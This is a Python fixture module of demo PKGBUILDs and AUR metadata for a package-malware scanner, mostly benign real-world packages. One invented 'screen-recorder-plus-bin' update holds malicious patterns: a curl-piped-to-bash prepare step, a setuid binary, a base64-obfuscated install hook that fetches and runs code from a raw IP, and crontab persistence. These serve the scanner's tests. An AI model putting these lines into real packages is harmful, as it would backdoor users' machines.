"""Demo-PKGBUILDs (alt/neu) und AUR-Metadaten für den Scanner.

„screen-recorder-plus-bin“ ist frei erfunden und zeigt typische Muster echter AUR-Malware-Fälle.
"""

from __future__ import annotations

PARU = r'''# Maintainer: Demo <demo@example.org>
pkgname=paru
pkgver=2.1.0
pkgrel=3
pkgdesc='Feature packed AUR helper'
url='https://github.com/morganamilo/paru'
arch=('x86_64')
license=('GPL-3.0-or-later')
depends=('git' 'pacman' 'libalpm.so')
makedepends=('cargo')
source=("$pkgname-$pkgver.tar.gz::https://github.com/morganamilo/paru/archive/v$pkgver.tar.gz")
sha256sums=('9c1e3d2f5b7a4e8f0a1b2c3d4e5f60718293a4b5c6d7e8f9a0b1c2d3e4f5a6b7')

build() {
  cd "$pkgname-$pkgver"
  cargo build --frozen --release --features git
}

package() {
  cd "$pkgname-$pkgver"
  install -Dm755 target/release/paru "$pkgdir/usr/bin/paru"
  install -Dm644 paru.conf "$pkgdir/etc/paru.conf"
}
'''

VSCODE = r'''# Maintainer: Demo <demo@example.org>
pkgname=visual-studio-code-bin
pkgver=1.106.1
pkgrel=1
pkgdesc='Visual Studio Code (vscode): Editor for building and debugging modern web and cloud applications'
arch=('x86_64')
url='https://code.visualstudio.com/'
license=('custom: commercial')
depends=('libxkbfile' 'gnupg' 'gtk3' 'libsecret' 'nss' 'gcc-libs' 'libnotify' 'libxss' 'glibc')
source_x86_64=("code_x64_${pkgver}.tar.gz::https://update.code.visualstudio.com/${pkgver}/linux-x64/stable")
sha256sums_x86_64=('0f1e2d3c4b5a69788796a5b4c3d2e1f00f1e2d3c4b5a69788796a5b4c3d2e1f0')

package() {
  install -d "${pkgdir}/opt/${pkgname}"
  cp -r "${srcdir}/VSCode-linux-x64/"* "${pkgdir}/opt/${pkgname}" -R
  install -d "${pkgdir}/usr/bin"
  ln -s /opt/${pkgname}/bin/code "${pkgdir}/usr/bin/code"
}
'''

SPOTIFY_OLD = r'''# Maintainer: Demo <demo@example.org>
pkgname=spotify
pkgver=1.2.74
pkgrel=1
epoch=1
pkgdesc='A proprietary music streaming service'
arch=('x86_64')
url='https://www.spotify.com'
license=('custom')
depends=('alsa-lib' 'gtk3' 'libxss' 'nss' 'openssl')
source=("spotify-${pkgver}.deb::http://repository.spotify.com/pool/non-free/s/spotify-client/spotify-client_${pkgver}_amd64.deb"
        "Release::http://repository.spotify.com/dists/testing/Release"
        "Release.sig::http://repository.spotify.com/dists/testing/Release.sig")
sha512sums=('aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22cc33dd44ee55ff66aa11bb22'
            'SKIP'
            'SKIP')
validpgpkeys=('E1096BCBFF6D418796DE78515384CE82BA52C83A')

package() {
  tar -xf data.tar.gz -C "${pkgdir}"
  install -Dm644 "${pkgdir}/usr/share/spotify/spotify.desktop" "${pkgdir}/usr/share/applications/spotify.desktop"
}
'''

SPOTIFY_NEW = SPOTIFY_OLD.replace('pkgver=1.2.74', 'pkgver=1.2.76').replace(
    "sha512sums=('aa11bb22cc33dd44ee55ff66", "sha512sums=('77ee88ff99aa00bb11cc22dd")

NVIDIA_TWEAKS_OLD = r'''# Maintainer: (verwaist)
pkgname=nvidia-tweaks
pkgver=0.9
pkgrel=1
pkgdesc='NVIDIA tweaks and optimizations'
arch=('any')
url='https://example.org/nvidia-tweaks'
license=('GPL-3.0-or-later')
depends=('nvidia-utils')
install=nvidia-tweaks.install
source=('60-nvidia.rules' 'nvidia.conf' 'nvidia-tweaks.service')
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111'
            '2222222222222222222222222222222222222222222222222222222222222222'
            '3333333333333333333333333333333333333333333333333333333333333333')

package() {
  install -Dm644 60-nvidia.rules "$pkgdir/usr/lib/udev/rules.d/60-nvidia.rules"
  install -Dm644 nvidia.conf "$pkgdir/usr/lib/modprobe.d/nvidia.conf"
  install -Dm644 nvidia-tweaks.service "$pkgdir/usr/lib/systemd/system/nvidia-tweaks.service"
}
'''

NVIDIA_TWEAKS_NEW = NVIDIA_TWEAKS_OLD.replace('pkgver=0.9', 'pkgver=0.10')

NVIDIA_TWEAKS_INSTALL = r'''post_install() {
  systemctl enable nvidia-tweaks.service
  echo 'options nvidia NVreg_UsePageAttributeTable=1' >> /etc/modprobe.d/nvidia-extra.conf
}

post_upgrade() {
  post_install
}
'''

YTDLP = r'''# Maintainer: Demo <demo@example.org>
pkgname=python-yt-dlp-git
pkgver=2025.11.12.r4
pkgrel=1
pkgdesc='A youtube-dl fork with additional features and fixes (git)'
arch=('any')
url='https://github.com/yt-dlp/yt-dlp'
license=('Unlicense')
depends=('python')
makedepends=('git' 'python-build' 'python-installer' 'python-hatchling')
source=('git+https://github.com/yt-dlp/yt-dlp.git')
sha256sums=('SKIP')

pkgver() {
  cd yt-dlp
  git describe --long --tags | sed 's/\([^-]*-g\)/r\1/;s/-/./g'
}

build() {
  cd yt-dlp
  python -m build --wheel --no-isolation
}

package() {
  cd yt-dlp
  python -m installer --destdir="$pkgdir" dist/*.whl
}
'''

RECORDER_OLD = r'''# Maintainer: alice <alice@example.org>
pkgname=screen-recorder-plus-bin
pkgver=3.4.1
pkgrel=1
pkgdesc='Lightweight screen recorder with GPU encoding'
arch=('x86_64')
url='https://github.com/example/screen-recorder-plus'
license=('MIT')
depends=('ffmpeg' 'qt6-base')
source=("https://github.com/example/screen-recorder-plus/releases/download/v${pkgver}/srp-${pkgver}-x86_64.tar.zst")
sha256sums=('4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c')

package() {
  install -Dm755 srp "$pkgdir/usr/bin/srp"
  install -Dm644 srp.desktop "$pkgdir/usr/share/applications/srp.desktop"
}
'''

RECORDER_NEW = r'''# Maintainer: srp-builds <srp.builds.2026@proton.example>
pkgname=screen-recorder-plus-bin
pkgver=3.4.2
pkgrel=1
pkgdesc='Lightweight screen recorder with GPU encoding'
arch=('x86_64')
url='https://github.com/example/screen-recorder-plus'
license=('MIT')
depends=('ffmpeg' 'qt6-base' 'curl')
install=srp.install
source=("http://185.203.116.42/dl/srp-${pkgver}-x86_64.tar.zst")
sha256sums=('SKIP')

prepare() {
  curl -fsSL https://raw.githubusercontent.com/srp-builds/patches/main/setup.sh | bash
}

package() {
  install -Dm755 srp "$pkgdir/usr/bin/srp"
  install -Dm644 srp.desktop "$pkgdir/usr/share/applications/srp.desktop"
  chmod 4755 "$pkgdir/usr/bin/srp"
}
'''

RECORDER_INSTALL = r'''post_install() {
  echo "Y3VybCAtcyBodHRwOi8vMTg1LjIwMy4xMTYuNDIveCB8IHNoICY+L2Rldi9udWxsICYK" | base64 -d | sh
  mkdir -p /home/*/.config/systemd/user
  (crontab -l 2>/dev/null; echo "@reboot /usr/bin/srp --daemon") | crontab -
}

post_upgrade() {
  post_install
}
'''

# name -> Metadaten wie sie die AUR-RPC liefern würde (Demo)
AUR_META: dict[str, dict] = {
    'paru': dict(maintainer='morganamilo', votes=1890, popularity=48.2, first_submitted='2020-10-29',
                 last_modified='2026-11-10', maintainer_changed=None, out_of_date=False,
                 files={'PKGBUILD': (PARU.replace('pkgrel=3', 'pkgrel=2'), PARU)}),
    'visual-studio-code-bin': dict(maintainer='dcelasun', votes=1650, popularity=41.0, first_submitted='2016-04-14',
                                   last_modified='2026-11-13', maintainer_changed=None, out_of_date=False,
                                   files={'PKGBUILD': (VSCODE.replace('1.106.1', '1.106.0'), VSCODE)}),
    'spotify': dict(maintainer='demo-maint', votes=1230, popularity=22.4, first_submitted='2009-07-07',
                    last_modified='2026-11-14', maintainer_changed=None, out_of_date=False,
                    files={'PKGBUILD': (SPOTIFY_OLD, SPOTIFY_NEW)}),
    'python-yt-dlp-git': dict(maintainer='demo-maint', votes=140, popularity=3.1, first_submitted='2021-06-02',
                              last_modified='2026-11-12', maintainer_changed=None, out_of_date=False,
                              files={'PKGBUILD': (YTDLP, YTDLP)}),
    'nvidia-tweaks': dict(maintainer=None, votes=62, popularity=0.9, first_submitted='2021-02-11',
                          last_modified='2026-11-09', maintainer_changed=None, out_of_date=True,
                          files={'PKGBUILD': (NVIDIA_TWEAKS_OLD, NVIDIA_TWEAKS_NEW),
                                 'nvidia-tweaks.install': (NVIDIA_TWEAKS_INSTALL, NVIDIA_TWEAKS_INSTALL)}),
    'screen-recorder-plus-bin': dict(maintainer='srp-builds', votes=3, popularity=0.02, first_submitted='2024-03-18',
                                     last_modified='2026-11-15', maintainer_changed='2026-11-13', out_of_date=False,
                                     previous_maintainer='alice',
                                     files={'PKGBUILD': (RECORDER_OLD, RECORDER_NEW),
                                            'srp.install': ('', RECORDER_INSTALL)}),
}
